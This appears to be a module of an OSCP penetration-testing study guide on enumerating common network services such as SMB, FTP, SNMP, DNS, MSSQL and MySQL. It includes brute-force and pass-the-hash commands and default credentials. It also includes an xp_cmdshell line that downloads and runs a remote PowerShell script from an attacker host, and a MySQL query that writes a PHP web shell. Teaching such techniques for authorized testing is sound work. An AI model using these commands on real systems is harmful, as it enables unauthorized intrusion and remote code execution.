# 04 — Service Enumeration

Enumeration is where you spend 80% of your time and where the OSCP is won or lost. This module covers how to dig deeply into every common service. For each service: what it is, how to enumerate it, what to look for, and what attack paths it opens.

---

## SMB (Ports 139, 445)

### What it is

Server Message Block — Windows file and printer sharing. The richest enumeration target on any Windows network. Reveals usernames, shares, OS versions, domain information, and often has exploitable misconfigurations.

### Enumeration

```bash
# The all-in-one tool
enum4linux -a TARGET

# What enum4linux checks:
# - OS information
# - User listing
# - Share listing
# - Password policy
# - Group listing
# - RID cycling (finds users even when listing is blocked)

# CrackMapExec (more modern, better output)
crackmapexec smb TARGET                                    # basic info
crackmapexec smb TARGET -u '' -p ''                        # null session
crackmapexec smb TARGET -u 'guest' -p ''                   # guest session
crackmapexec smb TARGET -u user -p pass --shares           # list shares
crackmapexec smb TARGET -u user -p pass --users            # list users
crackmapexec smb TARGET -u user -p pass --groups           # list groups
crackmapexec smb TARGET -u user -p pass --pass-pol         # password policy

# smbclient — manual share access
smbclient -L //TARGET -N                                    # list shares (null session)
smbclient -L //TARGET -U username                           # list shares (with creds)
smbclient //TARGET/sharename -N                             # connect to share (null)
smbclient //TARGET/sharename -U username                    # connect with creds

# Inside smbclient
smb: \> ls                      # list files
smb: \> cd directory            # change directory
smb: \> get filename            # download a file
smb: \> mget *                  # download everything
smb: \> put localfile           # upload a file
smb: \> recurse on; prompt off; mget *   # download everything recursively

# nmap SMB scripts
nmap --script smb-enum-shares -p 445 TARGET
nmap --script smb-enum-users -p 445 TARGET
nmap --script smb-os-discovery -p 445 TARGET
nmap --script smb-vuln* -p 445 TARGET                      # check for known vulns
nmap --script smb-brute -p 445 TARGET                      # brute force

# smbmap — permissions-aware share enumeration
smbmap -H TARGET
smbmap -H TARGET -u '' -p ''
smbmap -H TARGET -u user -p pass
smbmap -H TARGET -u user -p pass -r sharename              # list contents
smbmap -H TARGET -u user -p pass -R sharename              # recursive listing
```

### What to look for

```
- Shares accessible without credentials (null session)
- Shares accessible with guest account
- Readable shares containing: scripts, configs, credentials, notes
- Writable shares (upload a web shell if share = web root)
- SMBv1 enabled (vulnerable to EternalBlue — MS17-010)
- User list (targets for password spraying)
- Password policy (lockout threshold for brute forcing)
- OS version (determines which exploits apply)
```

### Common shares and what they contain

| Share | What it is |
|---|---|
| `ADMIN$` | Maps to C:\Windows — admin only |
| `C$` | Entire C: drive — admin only |
| `IPC$` | Inter-process communication — used for null sessions |
| `SYSVOL` | Domain GPO files — often contains GPP passwords |
| `NETLOGON` | Login scripts — may contain credentials |
| Custom shares | Whatever the admin shared — check everything |

---

## FTP (Port 21)

### What it is

File Transfer Protocol. Old, insecure (cleartext), but still everywhere. The main thing to check: **anonymous login**.

### Enumeration

```bash
# Connect manually
ftp TARGET
# Username: anonymous
# Password: (press Enter, or try your email)

# If anonymous works
ftp> ls -la                    # list everything including hidden files
ftp> binary                    # switch to binary mode (for non-text files)
ftp> prompt off                # don't ask before each download
ftp> mget *                    # download everything
ftp> cd ..                     # can you go up? (might access other directories)
ftp> put test.txt              # can you upload? (writable = potential shell upload)

# nmap scripts
nmap --script ftp-anon -p 21 TARGET          # anonymous login check
nmap --script ftp-brute -p 21 TARGET         # brute force
nmap --script ftp-vuln* -p 21 TARGET         # known vulnerabilities

# Banner grab
nc -vn TARGET 21
```

### What to look for

```
- Anonymous login allowed (FTP code 230 = success)
- Readable files: configs, notes, credentials, backups, source code
- Writable directory (if FTP root = web root, upload a web shell)
- Software version (searchsploit it — vsftpd 2.3.4 has a famous backdoor)
- Hidden files (ls -la shows dotfiles)
- Can you navigate outside the FTP root? (cd ..)
```

---

## SNMP (Port 161 UDP)

### What it is

Simple Network Management Protocol. Used for monitoring and managing network devices. Often overlooked because it's UDP, but it's a goldmine — SNMP can reveal running processes, installed software, network interfaces, user accounts, and system configuration.

### Why it matters

SNMP uses "community strings" as passwords. The default is `public` (read-only) and `private` (read-write). Many systems never change these defaults. If you can query SNMP, you get a massive information dump without any real authentication.

### Enumeration

```bash
# Brute force community strings
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt TARGET

# If you find the community string (let's say it's "public")
snmpwalk -v2c -c public TARGET

# Targeted queries
snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.25.4.2.1.2      # running processes
snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.25.6.3.1.2      # installed software  
snmpwalk -v2c -c public TARGET 1.3.6.1.4.1.77.1.2.25       # user accounts
snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.6.13.1.3        # TCP connections
snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.2.2.1.2         # network interfaces

# snmp-check — friendlier output
snmp-check TARGET -c public

# nmap
nmap -sU --script snmp-brute -p 161 TARGET
nmap -sU --script snmp-info -p 161 TARGET
nmap -sU --script snmp-processes -p 161 TARGET
```

### What to look for

```
- Running processes (might reveal hidden services, custom apps, paths)
- Installed software with versions (searchsploit each one)
- User accounts (targets for brute forcing)
- Network interfaces (reveals hidden subnets for pivoting)
- Community string "private" works (read-write access — can modify configs)
```

---

## DNS (Port 53)

### Enumeration

```bash
# Zone transfer (dumps ALL DNS records — if allowed)
dig axfr domain.com @TARGET
host -l domain.com TARGET

# Reverse lookup
dig -x TARGET_IP @DNS_SERVER

# Specific record types
dig A domain.com @TARGET          # IP addresses
dig MX domain.com @TARGET         # mail servers
dig NS domain.com @TARGET         # name servers
dig TXT domain.com @TARGET        # text records (might have SPF, verification strings)
dig ANY domain.com @TARGET        # everything

# Subdomain brute force
gobuster dns -d domain.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r TARGET:53

# nmap
nmap --script dns-zone-transfer -p 53 TARGET
nmap --script dns-brute TARGET
```

### What to look for

```
- Zone transfer allowed (reveals every hostname and IP in the domain)
- Internal hostnames (dev.company.local, staging.company.local)
- Mail servers (potential targets)
- Hidden subdomains (admin.company.local, vpn.company.local)
```

---

## SMTP (Port 25)

### What it is

Simple Mail Transfer Protocol. Email sending. The main use for OSCP: **user enumeration** — you can verify which usernames exist on the system.

### Enumeration

```bash
# Connect and verify users manually
nc -vn TARGET 25
VRFY admin         # if the user exists, server confirms
VRFY root
VRFY john
EXPN admin         # expand — shows group members

# Automated user enumeration
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t TARGET

# nmap
nmap --script smtp-enum-users -p 25 TARGET
nmap --script smtp-open-relay -p 25 TARGET
```

### VRFY response codes

```
252 = user exists (or server can't verify but accepts)
550 = user does not exist
```

---

## NFS (Port 2049)

### What it is

Network File System — Linux/Unix file sharing (like SMB for Linux). If you can mount an NFS export, you access files as if they were local.

### Enumeration

```bash
# Show available exports
showmount -e TARGET

# Example output:
# /srv/share    *             ← anyone can mount this
# /home         10.10.10.0/24 ← only internal network

# Mount the share
sudo mkdir /mnt/nfs
sudo mount -t nfs TARGET:/srv/share /mnt/nfs

# Browse the files
ls -la /mnt/nfs

# nmap
nmap --script nfs-ls,nfs-showmount,nfs-statfs -p 2049 TARGET

# Check /etc/exports on the target (if you have a shell)
cat /etc/exports
# Look for no_root_squash — privesc opportunity (see Linux privesc module)
```

---

## MSSQL (Port 1433)

### Enumeration

```bash
# nmap
nmap --script ms-sql-info,ms-sql-config,ms-sql-ntlm-info -p 1433 TARGET
nmap --script ms-sql-brute -p 1433 TARGET

# Impacket
impacket-mssqlclient user:password@TARGET
impacket-mssqlclient sa:password@TARGET       # sa = sysadmin, the default admin account

# Inside MSSQL
SQL> SELECT @@version;
SQL> SELECT name FROM master.dbo.sysdatabases;
SQL> SELECT * FROM database.dbo.users;

# Enable xp_cmdshell (command execution!)
SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC xp_cmdshell 'whoami';
SQL> EXEC xp_cmdshell 'powershell -c "iex(new-object net.webclient).downloadstring(''http://KALI/shell.ps1'')"';

# CrackMapExec
crackmapexec mssql TARGET -u sa -p password
crackmapexec mssql TARGET -u sa -p password -x "whoami"
```

### Default credentials to try

```
sa : (blank)
sa : sa
sa : password
sa : Password1
```

---

## MySQL (Port 3306)

### Enumeration

```bash
# Connect
mysql -h TARGET -u root -p
mysql -h TARGET -u root                    # no password (misconfiguration)

# Inside MySQL
SHOW databases;
USE database_name;
SHOW tables;
SELECT * FROM users;
SELECT * FROM mysql.user;                  # all MySQL user accounts

# Read files (if FILE privilege exists)
SELECT LOAD_FILE('/etc/passwd');

# Write files (web shell)
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

# nmap
nmap --script mysql-info,mysql-enum,mysql-brute -p 3306 TARGET
```

---

## RDP (Port 3389)

### Enumeration

```bash
# Connect with credentials
xfreerdp /v:TARGET /u:username /p:password /cert-ignore /dynamic-resolution

# Connect with hash
xfreerdp /v:TARGET /u:administrator /pth:NTLM_HASH /cert-ignore

# Brute force
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://TARGET -t 4

# nmap
nmap --script rdp-vuln-ms12-020 -p 3389 TARGET
nmap --script rdp-ntlm-info -p 3389 TARGET
```

---

## WinRM (Port 5985/5986)

### Enumeration

```bash
# Check if accessible
crackmapexec winrm TARGET -u username -p password

# Connect
evil-winrm -i TARGET -u username -p password
evil-winrm -i TARGET -u username -H NTLM_HASH

# Inside evil-winrm (PowerShell environment)
*Evil-WinRM* PS> whoami
*Evil-WinRM* PS> upload /tmp/winpeas.exe C:\temp\winpeas.exe
*Evil-WinRM* PS> download C:\Users\admin\Desktop\proof.txt
*Evil-WinRM* PS> menu      # see built-in commands
```

---

## Enumeration Checklist (do this for EVERY machine)

```
□ nmap -sV -sC (version + default scripts)
□ nmap -p- (full port scan)
□ nmap -sU --top-ports 20 (UDP)
□ For EACH open port:
  □ Banner grabbed (nc -vn TARGET PORT)
  □ Exact version searched in searchsploit
  □ Service-specific enumeration tool run
  □ Default credentials tried
  □ nmap scripts run for that service
  □ All findings documented
```
